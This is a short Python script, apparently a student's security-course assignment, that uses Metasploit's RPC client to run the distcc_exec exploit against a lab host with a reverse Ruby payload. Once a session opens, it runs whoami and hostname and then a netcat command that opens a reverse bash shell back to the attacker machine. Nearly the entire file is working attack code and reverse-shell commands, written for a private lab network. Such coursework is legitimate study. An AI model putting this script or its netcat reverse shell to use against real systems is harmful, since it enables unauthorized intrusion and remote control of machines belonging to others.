'''
Michael Epstein
OPSC-540-81
'''

#import statements
from metasploit.msfrpc import MsfRpcClient
import six
import time 

#code
def authenticate():    
    return MsfRpcClient('test', ssl=False, username='msf')

def exec_cmd(mtr, cmd):    
    print('Executing cmd: '+cmd)    
    mtr.write(cmd+'\n')    
    time.sleep(1) # wait for the data to become available    
    print(mtr.read())

rpc = authenticate()
    # set handler here# set distcc exploit for handler
handler = rpc.modules.use('exploit', 'unix/misc/distcc_exec')

    # set payload here# set payload as reverse_ruby
payload = rpc.modules.use('payload', 'cmd/unix/reverse_ruby')
payload['LHOST'] = "192.168.1.1" # Kali host IP Address, local
    
handler['RHOST'] = "192.168.1.3" # metasploit ip, remote host
    
session = handler.execute(payload=payload)
# wait until we have an active session
while len(rpc.sessions.list) == 0:    
    time.sleep(10)

# got a connection
for client_id, client_info in six.iteritems(rpc.sessions.list):    
    mtr = rpc.sessions.session(client_id)    
    cmd = 'whoami'    
    exec_cmd(mtr, cmd)    
    cmd = 'hostname'    
    exec_cmd(mtr, cmd)
    cmd = 'nc 192.168.1.1 1234 -e /bin/bash'    
    exec_cmd(mtr, cmd)